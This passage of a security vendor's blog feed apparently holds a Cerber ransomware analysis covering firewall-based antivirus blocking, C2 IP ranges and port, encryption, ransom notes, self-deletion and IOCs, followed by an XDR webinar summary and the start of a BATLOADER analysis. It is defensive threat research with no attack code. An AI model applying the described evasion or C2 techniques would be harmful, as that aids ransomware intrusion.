information:</p>\n<ul>\n<li>Blocklisted file extensions and folders</li>\n<li>Excluded country based on Language ID</li>\n<li>Targeted Extensions</li>\n<li>Base64 encrypted Public RSA key and Ransom Note in HTML format</li>\n<li>Ransom Note in TXT format</li>\n</ul>\n<p><img class=\"size-full wp-image-5921 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.3_decrypted-data.png\" alt=\"\" width=\"808\" height=\"181\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.3_decrypted-data.png 808w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.3_decrypted-data-300x67.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.3_decrypted-data-768x172.png 768w\" sizes=\"(max-width: 808px) 100vw, 808px\" /></p>\n<p style=\"text-align: center;\"><em>Fig.3: Decrypted data</em></p>\n<p>The Ransomware decided to exclude several countries from the attack (<strong>Armenia, Azerbaijan, Belarus, Georgia, Kyrgyzstan, Kazakhstan, Moldova, Russia, Turkmenistan, Tajikistan, Ukraine, and Uzbekistan)</strong>.</p>\n<p><img class=\"size-full wp-image-5922 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.4_Excluded-extensions-folders-and-Country-codes.png\" alt=\"\" width=\"1298\" height=\"302\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.4_Excluded-extensions-folders-and-Country-codes.png 1298w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.4_Excluded-extensions-folders-and-Country-codes-300x70.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.4_Excluded-extensions-folders-and-Country-codes-768x179.png 768w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.4_Excluded-extensions-folders-and-Country-codes-1024x238.png 1024w\" sizes=\"(max-width: 1298px) 100vw, 1298px\" /></p>\n<p style=\"text-align: center;\"><em>Fig.4: Excluded extensions, folders, and country codes</em></p>\n<p>Then it traverses the decrypted data and uses its value for further encryption processes.</p>\n<p><img class=\"size-full wp-image-5923 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.5_Traversing-the-data.png\" alt=\"\" width=\"982\" height=\"202\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.5_Traversing-the-data.png 982w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.5_Traversing-the-data-300x62.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.5_Traversing-the-data-768x158.png 768w\" sizes=\"(max-width: 982px) 100vw, 982px\" /></p>\n<p style=\"text-align: center;\"><em>Fig.5: Traversing the data</em></p>\n<p><strong>Evasion Technique:</strong></p>\n<p>Cerber exhibits advanced capabilities by identifying and configuring Windows firewall rules to obstruct outbound traffic from the executable binaries of installed firewalls, antivirus, and anti-spyware products. This tactic aims to impede the communication and functionality of these security tools, potentially enhancing the ransomware&#8217;s ability to persist on the compromised system and evade detection. This sophisticated maneuver underscores the evolving nature of Cerber, posing a significant challenge for cybersecurity measures seeking to counteract its impact.</p>\n<p><img class=\"size-full wp-image-5924 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.6_Disabling-AV-services.png\" alt=\"\" width=\"846\" height=\"286\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.6_Disabling-AV-services.png 846w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.6_Disabling-AV-services-300x101.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.6_Disabling-AV-services-768x260.png 768w\" sizes=\"(max-width: 846px) 100vw, 846px\" /></p>\n<p style=\"text-align: center;\"><em>Fig.6: Disabling AV services</em></p>\n<p><strong>C2 Connection:</strong></p>\n<p>Cerber ransomware establishes connections to port 6893 on IPs specified by CIDR in the configuration. The communication packet initiation involves a hash prefixed with the Machine GUID (MD5_KEY). The packet concludes with parameters such as PARTNER_ID, OS details, IS_X64 (indicating whether the system is 64-bit), IS_ADMIN (reflecting administrative privileges), COUNT_FILES (the count of files on the system), STOP_REASON (reason for stopping), and STATUS (status information). This communication protocol serves as a method for exchanging data with the specified IPs, illustrating the ransomware&#8217;s sophisticated approach to interaction and control within the compromised system.</p>\n<p>The communication packet starts with a hash consisting of the Machine GUID: {MD5_KEY} and ending with {PARTNER_ID}{OS}{IS_X64}{IS_ADMIN}{COUNT_FILES}{STOP_REASON}{STATUS}.</p>\n<p>With Ip varying form ip&#8221;:[&#8220;93.107.12.0/27&#8243;,&#8221;95.1.200.0/27&#8243;,&#8221;87.98.176.0/22&#8221;]</p>\n<p><img class=\"size-full wp-image-5925 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.7_C2-connection.png\" alt=\"\" width=\"794\" height=\"227\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.7_C2-connection.png 794w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.7_C2-connection-300x86.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.7_C2-connection-768x220.png 768w\" sizes=\"(max-width: 794px) 100vw, 794px\" /></p>\n<p style=\"text-align: center;\"><em>Fig.7: C2 connection</em></p>\n<p><strong>Encryption:</strong></p>\n<p>It drops two files containing the RSA key, which is further used for the Encryption process.</p>\n<p><img class=\"size-full wp-image-5926 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.8_Adding-part-of-the-key-in-the-tmp-file.png\" alt=\"\" width=\"1060\" height=\"406\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.8_Adding-part-of-the-key-in-the-tmp-file.png 1060w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.8_Adding-part-of-the-key-in-the-tmp-file-300x115.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.8_Adding-part-of-the-key-in-the-tmp-file-768x294.png 768w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.8_Adding-part-of-the-key-in-the-tmp-file-1024x392.png 1024w\" sizes=\"(max-width: 1060px) 100vw, 1060px\" /></p>\n<p style=\"text-align: center;\"><em>Fig.8: Adding part of the key in the tmp file</em></p>\n<p><img class=\"size-full wp-image-5927 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.9_Adding-part-of-the-key-in-the-tmp-file.png\" alt=\"\" width=\"1348\" height=\"469\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.9_Adding-part-of-the-key-in-the-tmp-file.png 1348w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.9_Adding-part-of-the-key-in-the-tmp-file-300x104.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.9_Adding-part-of-the-key-in-the-tmp-file-768x267.png 768w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.9_Adding-part-of-the-key-in-the-tmp-file-1024x356.png 1024w\" sizes=\"(max-width: 1348px) 100vw, 1348px\" /></p>\n<p style=\"text-align: center;\"><em>Fig.9: Adding part of the key in the tmp file</em></p>\n<p><img class=\"size-full wp-image-5928 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.10_Use-of-Crypto-API.png\" alt=\"\" width=\"458\" height=\"242\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.10_Use-of-Crypto-API.png 458w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.10_Use-of-Crypto-API-300x159.png 300w\" sizes=\"(max-width: 458px) 100vw, 458px\" /></p>\n<p style=\"text-align: center;\"><em>Fig.10: Use of Crypto API</em></p>\n<p>It implements RSA and RC4 algorithms in its encryption routine and uses CryptoAPI &#8211; a separate function that reads and skips the first 1800 bytes and encrypts the rest of the content, and writes back to the file &#8211; as mentioned in Fig 12.</p>\n<p>Following the encryption process, the ransomware appends a &#8220;.a769&#8221; extension and renames the file with a randomly generated string with pattern [0-9a-zA-Z_-]{10}. The figure below illustrates the files that have undergone this encryption and changes in file names and extensions.</p>\n<p><img class=\"size-full wp-image-5929 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.11_Encrypted-files.png\" alt=\"\" width=\"551\" height=\"156\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.11_Encrypted-files.png 551w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.11_Encrypted-files-300x85.png 300w\" sizes=\"(max-width: 551px) 100vw, 551px\" /></p>\n<p style=\"text-align: center;\"><em>Fig.11: Encrypted files</em></p>\n<p><img class=\"size-full wp-image-5930 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.12_Skipping-1800-bytes-from-the-header.png\" alt=\"\" width=\"1086\" height=\"429\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.12_Skipping-1800-bytes-from-the-header.png 1086w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.12_Skipping-1800-bytes-from-the-header-300x119.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.12_Skipping-1800-bytes-from-the-header-768x303.png 768w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.12_Skipping-1800-bytes-from-the-header-1024x405.png 1024w\" sizes=\"(max-width: 1086px) 100vw, 1086px\" /></p>\n<p style=\"text-align: center;\"><em>Fig.12: Skipping 1800 bytes from the header</em></p>\n<p><strong>Ransom notes:</strong></p>\n<p>It drops the ransom notes in the folders with the encrypted files with the name &#8220;__R_E_A_D__T_H_I_S__.html&#8221; and TXT form. In this ransom note, the threat actors (TAs) instruct the victims to contact them via their TOR website. Furthermore, the TAs issue a warning that if the victims fail to contact within 30 days following the ransomware attack, they will disclose the victims’ confidential data on public news outlets and websites.</p>\n<p><img class=\"size-full wp-image-5931 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.13_Dropped-Ransom-Note-in-TXT-format.png\" alt=\"\" width=\"972\" height=\"555\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.13_Dropped-Ransom-Note-in-TXT-format.png 972w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.13_Dropped-Ransom-Note-in-TXT-format-300x171.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.13_Dropped-Ransom-Note-in-TXT-format-768x439.png 768w\" sizes=\"(max-width: 972px) 100vw, 972px\" /></p>\n<p style=\"text-align: center;\"><em>Fig.13: Dropped Ransom Note in TXT format</em></p>\n<p><img class=\"size-full wp-image-5932 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.14_Dropped-Ransom-Note-in-HTML-file.png\" alt=\"\" width=\"1237\" height=\"532\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.14_Dropped-Ransom-Note-in-HTML-file.png 1237w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.14_Dropped-Ransom-Note-in-HTML-file-300x129.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.14_Dropped-Ransom-Note-in-HTML-file-768x330.png 768w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.14_Dropped-Ransom-Note-in-HTML-file-1024x440.png 1024w\" sizes=\"(max-width: 1237px) 100vw, 1237px\" /></p>\n<p style=\"text-align: center;\"><em>Fig.14: Dropped Ransom Note in HTML file</em></p>\n<p><img class=\"size-full wp-image-5933 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.15_Changed-desktop-wallpaper.png\" alt=\"\" width=\"1100\" height=\"511\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.15_Changed-desktop-wallpaper.png 1100w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.15_Changed-desktop-wallpaper-300x139.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.15_Changed-desktop-wallpaper-768x357.png 768w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.15_Changed-desktop-wallpaper-1024x476.png 1024w\" sizes=\"(max-width: 1100px) 100vw, 1100px\" /></p>\n<p style=\"text-align: center;\"><em>Fig.15: Changed desktop wallpaper</em></p>\n<p><strong>Post Encryption:</strong></p>\n<p>Following infection, the ransomware employs the ShellExecuteA() API function with specific arguments to eliminate its own file from the compromised system. Through this action, the malware orchestrates the removal of its executable, leaving behind solely the encrypted files and the accompanying ransom note. This deliberate self-deletion mechanism indicates an attempt by the ransomware to conceal its presence, complicating post-infection analysis and removal efforts while ensuring the persistence of the encrypted files and the associated ransom demand.</p>\n<p><img class=\"size-full wp-image-5934 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.16_1-Self-delete-using-ShellExecuteA-function.png\" alt=\"\" width=\"435\" height=\"116\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.16_1-Self-delete-using-ShellExecuteA-function.png 435w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.16_1-Self-delete-using-ShellExecuteA-function-300x80.png 300w\" sizes=\"(max-width: 435px) 100vw, 435px\" /></p>\n<p><img class=\"alignnone size-full wp-image-5935 aligncenter\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.16_2_Self-delete-using-ShellExecuteA-function.png\" alt=\"\" width=\"809\" height=\"123\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.16_2_Self-delete-using-ShellExecuteA-function.png 809w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.16_2_Self-delete-using-ShellExecuteA-function-300x46.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/12/Fig.16_2_Self-delete-using-ShellExecuteA-function-768x117.png 768w\" sizes=\"(max-width: 809px) 100vw, 809px\" /></p>\n<p style=\"text-align: center;\"><em>  Fig.16: Self-delete using ShellExecuteA function</em></p>\n<p><strong>Precaution of Cerber Ransomware </strong></p>\n<p>Cerber Ransomware is a type of malware that encrypts a victim&#8217;s files and demands a ransom for the decryption key. To protect yourself and your computer systems from Cerber Ransomware, or ransomware in general, it is essential to take various precautions. Here are a few measures you can take to minimize your risk:</p>\n<p><strong>Regularly Backup Your Data:</strong></p>\n<p>Back up your important data regularly to an external device or a cloud service. This way, if your files are encrypted, you won&#8217;t have to pay a ransom to recover them.</p>\n<p><strong>Keep Your Software Updated:</strong></p>\n<p>Ensure that your operating system and all software, including your antivirus program, are up to date. Ransomware often takes advantage of known vulnerabilities in outdated software.</p>\n<p><strong>Use Strong, Unique Passwords:</strong></p>\n<p>Use strong and complex passwords for all your accounts and devices. Consider using a reputable password manager to generate and store strong passwords.</p>\n<p><strong>Enable Two-Factor Authentication (2FA):</strong></p>\n<p>Enable 2FA whenever possible for your online accounts. This provides an extra layer of security, making it more difficult for attackers to access your accounts.</p>\n<p><strong>Exercise Caution with Email:</strong></p>\n<p>Be wary of email attachments and links, especially from unknown or unexpected sources. Ransomware can be delivered through phishing emails.</p>\n<p><strong>Install a Reliable Antivirus Program:</strong></p>\n<p>Install and regularly update a reputable antivirus or anti-malware software. Make sure it includes real-time scanning and ransomware protection features.</p>\n<p><strong>Use a Firewall:</strong></p>\n<p>A good firewall can help block incoming threats and reduce the likelihood of a malware infection.</p>\n<p><strong>Regularly Update and Patch:</strong></p>\n<p>Keep your system and software updated. Many ransomware attacks exploit vulnerabilities in outdated software, so patching these vulnerabilities is essential.</p>\n<p><strong>Network Security:</strong></p>\n<p>Implement network security measures, such as intrusion detection systems, and regularly audit network traffic for unusual activity.</p>\n<p><strong>Monitor for Suspicious Activity:</strong></p>\n<p>Keep an eye out for any unusual or suspicious activity on your computer or network, as early detection can help stop an infection from spreading.</p>\n<p><strong>Regularly Test Backups:</strong></p>\n<p>Periodically test your backups to ensure that they can be successfully restored.</p>\n<p><strong>SEQRITE Protection:</strong></p>\n<p>Ransom.Cerber.S443347</p>\n<p>Ransom.Cerber.S126609</p>\n<p>Ransom.Cerber.S22591</p>\n<p>Ransom.Cerber.S1538045</p>\n<p><strong>Conclusion:</strong></p>\n<p>Cerber ransomware, first identified in 2016, represents a highly sophisticated threat with advanced evasion techniques. It can configure Windows firewall rules, exclude specific countries from attacks, and employ persistence on compromised systems. It combines RSA and RC4 algorithms in the encryption process and uses the self-deletion mechanism post-infection.</p>\n<p><strong>MITRE ATT&amp;CK TTPs:</strong></p>\n<table>\n<tbody>\n<tr>\n<td width=\"300\"><strong>Command and Scripting Interpreter</strong></td>\n<td width=\"300\"><strong>T1059</strong></td>\n</tr>\n<tr>\n<td width=\"300\"><strong>Inhibit System Recovery</strong></td>\n<td width=\"300\"><strong>T1490</strong></td>\n</tr>\n<tr>\n<td width=\"300\"><strong>File and Directory Discovery</strong></td>\n<td width=\"300\"><strong>T1083</strong></td>\n</tr>\n<tr>\n<td width=\"300\"><strong>System Information Discovery</strong></td>\n<td width=\"300\"><strong>T1082</strong></td>\n</tr>\n<tr>\n<td width=\"300\"><strong>Data Encrypted for Impact</strong></td>\n<td width=\"300\"><strong>T1486</strong></td>\n</tr>\n<tr>\n<td width=\"300\"><strong>Service Stop</strong></td>\n<td width=\"300\"><strong>T1489</strong></td>\n</tr>\n</tbody>\n</table>\n<p><strong>IOCs:</strong></p>\n<p>FE1BC60A95B2C2D77CD5D232296A7FA4</p>\n<p>376165CCD556CD74658AFEA9F6F428F9</p>\n<p><strong>Authors: </strong></p>\n<p><strong>Soumen Burma </strong></p>\n<p><strong>Vaibhav Krushna Billade</strong></p>\n<p>The post <a rel=\"follow\" href=\"https://www.seqrite.com/blog/cerber-ransomware-exposed-a-comprehensive-analysis-of-advanced-tactics-encryption-and-evasion/\" data-wpel-link=\"internal\" target=\"_self\">Cerber Ransomware Exposed: A Comprehensive Analysis of Advanced Tactics, Encryption, and Evasion</a> appeared first on <a rel=\"follow\" href=\"https://www.seqrite.com/blog\" data-wpel-link=\"internal\" target=\"_self\">Blogs on Information Technology, Network &amp; Cybersecurity | Seqrite</a>.</p>\n"},"wfw:commentRss":"https://www.seqrite.com/blog/cerber-ransomware-exposed-a-comprehensive-analysis-of-advanced-tactics-encryption-and-evasion/feed/","slash:comments":"0","commentcount":"0"},{"title":"Traversing the Cybersecurity Landscape: Unveiling the Essence of XDR","link":"https://www.seqrite.com/blog/traversing-the-cybersecurity-landscape-unveiling-the-essence-of-xdr/","comments":"https://www.seqrite.com/blog/traversing-the-cybersecurity-landscape-unveiling-the-essence-of-xdr/#respond","pubDate":"Mon, 11 Dec 2023 11:02:09 +0000","dc:creator":{"#cdata-section":"Mahua Chakrabarthy"},"author":"Mahua Chakrabarthy","category":{"#cdata-section":"XDR and EDR"},"guid":{"@isPermaLink":"false","#text":"https://www.seqrite.com/blog/?p=5913"},"img":"https://www.seqrite.com/blog/wp-content/uploads/2023/12/SEQRITE-Blog-new-XDR-230x168.png","description":{"#cdata-section":"<p>In the ever-evolving territory of cybersecurity, where businesses face persistent incidents of Advanced Attacks, the Extended Detection and Response (XDR) solution has become a crucial component in fortifying their IT infrastructure. This blog highlights the gist of the SEQRITE-ETCISO webinar “How to Turbocharge Your Cyber Response Team with XDR,” where our expert, Mr. Sourav Biswas, [&#8230;]</p>\n<p>The post <a rel=\"follow\" href=\"https://www.seqrite.com/blog/traversing-the-cybersecurity-landscape-unveiling-the-essence-of-xdr/\" data-wpel-link=\"internal\" target=\"_self\">Traversing the Cybersecurity Landscape: Unveiling the Essence of XDR</a> appeared first on <a rel=\"follow\" href=\"https://www.seqrite.com/blog\" data-wpel-link=\"internal\" target=\"_self\">Blogs on Information Technology, Network &amp; Cybersecurity | Seqrite</a>.</p>\n"},"content:encoded":{"#cdata-section":"<span class=\"rt-reading-time\" style=\"display: block;\"><span class=\"rt-label\">Estimated reading time: </span><span class=\"rt-time\">3</span><span class=\"rt-label\"> minutes</span></span><p>In the ever-evolving territory of cybersecurity, where businesses face persistent incidents of Advanced Attacks, the <a href=\"https://www.seqrite.com/hawkk/seqrite-hawkkhunt\" data-wpel-link=\"internal\" target=\"_self\" rel=\"follow\">Extended Detection and Response (XDR)</a> solution has become a crucial component in fortifying their IT infrastructure. This blog highlights the gist of the SEQRITE-ETCISO webinar “<strong><em><a href=\"https://www.youtube.com/watch?v=EoYWsFPTCVk&amp;t=1s\" data-wpel-link=\"external\" target=\"_blank\" rel=\"nofollow\">How to Turbocharge Your Cyber Response Team with XDR</a></em></strong>,” where our expert, Mr. Sourav Biswas, delved deep into the imperative nature of XDR in the contemporary digital landscape, shedding light on its significance, evolution, and the sophisticated threats it combats.</p>\n<p><strong>Understanding the Surge of Advanced Attacks</strong></p>\n<p>The term &#8220;Advanced Attack&#8221; signifies a breed of highly sophisticated cyber threats executed by seasoned criminals. From fileless malware to social engineering and password attacks, these threat actors deploy advanced technologies to infiltrate business IT environments stealthily. The distinguishing feature of these attacks is persistence &#8211; where cybercriminals stay in the networks for long periods, continuing their assault.</p>\n<p>The rising frequency of advanced attacks is a global concern. Pre-pandemic, the cybersecurity space witnessed a substantial volume of attacks. However, in the post-pandemic era, the incidence of advanced attacks has surged exponentially. Reports from our in-house Security Labs, as well as various global threat research organizations, have highlighted an alarming trend – a nearly doubling of advanced attacks annually.</p>\n<p><strong>Digital Adoption and the Vulnerability Paradigm</strong></p>\n<p>A key catalyst for the surge in advanced attacks is the fast-tracked digital adoption post-pandemic. Organizations globally embraced remote work, bring-your-own-device (BYOD), and other technology strategies for competitive advantage and enhanced business agility. This rapid shift has left cybersecurity practices and technologies struggling to keep pace, exposing organizations to advanced threats.</p>\n<p>Added to that, there is increased availability of advanced attack technologies, including AI-generated exploit kits. The result is a spate of attacks that outpace the capabilities of traditional security technologies.</p>\n<p><strong>The Inadequacy of Traditional Technologies</strong></p>\n<p>Detecting advanced attacks is one of the main challenges traditional security technologies face. These attacks unfold as a series of events over time, rendering static blocking rules and conventional technologies ineffective. Blocking a single event may lead to false positives and an incomplete understanding of the evolving attack. Hence, the need for technologies that correlate events, provide comprehensive insights, and facilitate proactive responses becomes paramount.</p>\n<p><strong>Decoding Advanced Attacks through MITRE Tactics</strong></p>\n<p>To comprehend advanced attacks in detail, we turn to MITRE tactics and techniques. MITRE Corporation, a US non-profit organization, has meticulously documented many adversary techniques and procedures (TTPs). The essence of XDR lies in modeling these tactics, correlating events, and raising alerts when event chains align with these patterns.</p>\n<p><strong>XDR: A Multifaceted Defense against Advanced Attacks</strong></p>\n<p><a href=\"https://www.seqrite.com/hawkk/seqrite-hawkkhunt\" data-wpel-link=\"internal\" target=\"_self\" rel=\"follow\">XDR</a> stands as a formidable defense mechanism against the intricacies of advanced attacks. It aggregates telemetry data from diverse sources, including traditional endpoint protection systems, EDR telemetry, and email and network alerts. The correlation of this data, coupled with MITRE TTP analytics, forms the core of XDR&#8217;s advanced detection capabilities.</p>\n<p>Behavior anomaly detection, another critical feature of XDR, involves baselining EDR data over time to identify anomalies effectively. External threat intelligence contextualizes incidents, qualifying their severity and enabling informed response actions.</p>\n<p><strong>The Role of XDR in Incident Response</strong></p>\n<p>Automated response rules within XDR trigger immediate actions when detecting specific event chains. The isolation of affected endpoints and an orchestrated, multi-step response on endpoints form a robust remediation strategy. Root cause analysis (RCA) and preventive measures complete the incident response cycle, providing organizations with insights to enhance their security posture.</p>\n<p><strong>Securing XDR: Fortifying the Guardian</strong></p>\n<p>Acknowledging concerns about the security of XDR itself, stringent measures are in place to prevent vulnerabilities. Specialized agents, access permissions, and self-protection technologies ensure the robustness of XDR. Hosting XDR on secure cloud platforms like AWS further enhances its resilience against potential exploits.</p>\n<p><strong>Conclusion: Embracing XDR for Cyber Resilience</strong></p>\n<p>As organizations navigate the complex cybersecurity realm, the necessity of <a href=\"https://www.seqrite.com/hawkk/seqrite-hawkkhunt\" data-wpel-link=\"internal\" target=\"_self\" rel=\"follow\">XDR</a> becomes evident. The surge in advanced attacks, coupled with the rapid pace of digital transformation, demands proactive and adaptive security measures. XDR emerges as a comprehensive and intelligent solution, providing not just detection but a holistic response to the evolving threat landscape. Embracing XDR is not just a strategic move; it&#8217;s a crucial step toward building cyber resilience in an era where the stakes have never been higher.</p>\n<p>Note: Watch the complete webinar at <em><a href=\"https://www.youtube.com/watch?v=EoYWsFPTCVk&amp;t=1s\" data-wpel-link=\"external\" target=\"_blank\" rel=\"nofollow\">https://www.youtube.com/watch?v=EoYWsFPTCVk&amp;t=1s</a></em></p>\n<p>The post <a rel=\"follow\" href=\"https://www.seqrite.com/blog/traversing-the-cybersecurity-landscape-unveiling-the-essence-of-xdr/\" data-wpel-link=\"internal\" target=\"_self\">Traversing the Cybersecurity Landscape: Unveiling the Essence of XDR</a> appeared first on <a rel=\"follow\" href=\"https://www.seqrite.com/blog\" data-wpel-link=\"internal\" target=\"_self\">Blogs on Information Technology, Network &amp; Cybersecurity | Seqrite</a>.</p>\n"},"wfw:commentRss":"https://www.seqrite.com/blog/traversing-the-cybersecurity-landscape-unveiling-the-essence-of-xdr/feed/","slash:comments":"0","commentcount":"0"},{"title":"Casting Light on BATLOADER: An Insight into its Role in Malware Delivery","link":"https://www.seqrite.com/blog/casting-light-on-batloader-an-insight-into-its-role-in-malware-delivery/","comments":"https://www.seqrite.com/blog/casting-light-on-batloader-an-insight-into-its-role-in-malware-delivery/#respond","pubDate":"Wed, 08 Nov 2023 06:51:57 +0000","dc:creator":{"#cdata-section":"Shrutirupa Banerjiee"},"author":"Shrutirupa Banerjiee","category":{"#cdata-section":"Uncategorized"},"guid":{"@isPermaLink":"false","#text":"https://www.seqrite.com/blog/?p=5897"},"img":"https://www.seqrite.com/blog/wp-content/uploads/2023/11/SEQRITE-Blog-Unmasking-BATLOADER-230x168.png","description":{"#cdata-section":"<p>Overview: In our rapidly advancing technological landscape, cyber threat actors have grown increasingly sophisticated, employing intricate attack chains and malicious applications. They meticulously plan and execute well-defined, strategic attacks that unfold in stages. A typical malware attack comprises various infection phases. This process unfolds step by step, ultimately leading to the activation of the core [&#8230;]</p>\n<p>The post <a rel=\"follow\" href=\"https://www.seqrite.com/blog/casting-light-on-batloader-an-insight-into-its-role-in-malware-delivery/\" data-wpel-link=\"internal\" target=\"_self\">Casting Light on BATLOADER: An Insight into its Role in Malware Delivery</a> appeared first on <a rel=\"follow\" href=\"https://www.seqrite.com/blog\" data-wpel-link=\"internal\" target=\"_self\">Blogs on Information Technology, Network &amp; Cybersecurity | Seqrite</a>.</p>\n"},"content:encoded":{"#cdata-section":"<span class=\"rt-reading-time\" style=\"display: block;\"><span class=\"rt-label\">Estimated reading time: </span><span class=\"rt-time\">5</span><span class=\"rt-label\"> minutes</span></span><p><strong>Overview:</strong></p>\n<p>In our rapidly advancing technological landscape, cyber threat actors have grown increasingly sophisticated, employing intricate attack chains and malicious applications. They meticulously plan and execute well-defined, strategic attacks that unfold in stages. A typical malware attack comprises various infection phases. This process unfolds step by step, ultimately leading to the activation of the core malicious payload. These stages not only attempt to evade anti-malware defenses but also aim to establish a hidden presence within the system, often remaining dormant for a period before any further action. These initial stages of an attack are primarily focused on implanting the final payload into the system.</p>\n<p>The final payload is often a well-known malware family with a different variant. However, the initial stage remains surprisingly the same. This is not just limited to different variants of the same malware family but also  others.  Recently, a batloader has emerged as a standard method for delivering the final payload of AgentTesla, a well-known InfoStealer.</p>\n<p>A batloader is a batch file that, once executed, performs further malicious activities in the system. The same batloader has been identified in distributing other malware families,  such as Ransomware, RATs, and Cryptojackers.</p>\n<p>The initial stage often relies on various phishing techniques to trick victims into downloading either a loader or a downloader. A loader is a harmful software with a malicious payload embedded, while a downloader is a program that directly fetches the payload from a command and control (CnC) server. The complexity of this process may vary, depending on how challenging the threat actors want it to be for malware analysts and researchers to dissect the sample.</p>\n<p>Here, we&#8217;ll explore the process of deploying the batloader, which loads an exe file into the memory. We&#8217;ll focus on AgentTesla for simplicity, but note that the same approach applies to the other malware families mentioned above.</p>\n<p><strong>Technical Analysis:</strong></p>\n<p><img class=\"alignnone size-full wp-image-5900\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/11/Fig1-InfectionChain.png\" alt=\"\" width=\"693\" height=\"339\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/11/Fig1-InfectionChain.png 693w, https://www.seqrite.com/blog/wp-content/uploads/2023/11/Fig1-InfectionChain-300x147.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/11/Fig1-InfectionChain-330x160.png 330w\" sizes=\"(max-width: 693px) 100vw, 693px\" /></p>\n<p style=\"text-align: center;\">Fig 1: Infection Chain</p>\n<p>The initial step often involves tricking victims into running the malicious file. This can happen when a user opens the file out of curiosity or through other techniques used to persuade them. In some cases, threat actors exploit vulnerabilities in the system to bypass this first step.</p>\n<p>In this case, the bat file is the malicious sample that needs to be executed by the user by any of the above-mentioned means. While analyzing this bat file, we observe that this is highly obfuscated.</p>\n<p><img class=\"alignnone size-full wp-image-5901\" src=\"https://www.seqrite.com/blog/wp-content/uploads/2023/11/Fig2-Obfuscated-Bat-File.png\" alt=\"\" width=\"1016\" height=\"482\" srcset=\"https://www.seqrite.com/blog/wp-content/uploads/2023/11/Fig2-Obfuscated-Bat-File.png 1016w, https://www.seqrite.com/blog/wp-content/uploads/2023/11/Fig2-Obfuscated-Bat-File-300x142.png 300w, https://www.seqrite.com/blog/wp-content/uploads/2023/11/Fig2-Obfuscated-Bat-File-768x364.png 768w\" sizes=\"(max-width: 1016px) 100vw, 1016px\" /></p>\n<p style=\"text-align: center;\">Fig 2: Obfuscated Bat File</p>\n<p><img class=\"alignnone size-full wp-image-5903\" 